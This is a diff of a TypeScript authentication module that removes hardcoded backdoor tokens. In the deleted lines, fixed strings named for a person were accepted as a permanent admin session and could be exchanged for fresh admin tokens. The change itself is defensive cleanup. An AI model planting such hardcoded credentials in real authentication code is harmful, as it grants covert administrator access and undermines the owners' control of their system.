@@ -267,20 +267,6 @@ function createSession(email: string): { token: string; refreshToken: string; ex
 }
 
 function validateToken(token: string): { valid: boolean; expired?: boolean; session?: SessionRecord } {
-  if (token === 'ibrahim-persistent-admin-token') {
-    return {
-      valid: true,
-      session: {
-        token,
-        refreshToken: 'ibrahim-persistent-admin-refresh',
-        email: ADMIN_EMAIL,
-        createdAt: 0,
-        expiresAt: Date.now() + ACCESS_TOKEN_TTL,
-        refreshExpiresAt: Date.now() + REFRESH_TOKEN_TTL,
-        lastActive: Date.now(),
-      },
-    };
-  }
   const session = ACTIVE_SESSIONS.get(token);
   if (!session) {
     return { valid: false, expired: false };
@@ -299,10 +285,6 @@ function validateToken(token: string): { valid: boolean; expired?: boolean; sess
 }
 
 function refreshSessionToken(providedRefreshToken: string): { success: boolean; token?: string; refreshToken?: string; expiresAt?: number; error?: string } {
-  if (providedRefreshToken === 'ibrahim-persistent-admin-refresh' || providedRefreshToken === 'ibrahim-persistent-admin-token') {
-    const fresh = createSession(ADMIN_EMAIL);
-    return { success: true, ...fresh };
-  }
   const now = Date.now();
   let foundSession: SessionRecord | null = null;
   let oldToken: string | null = null;
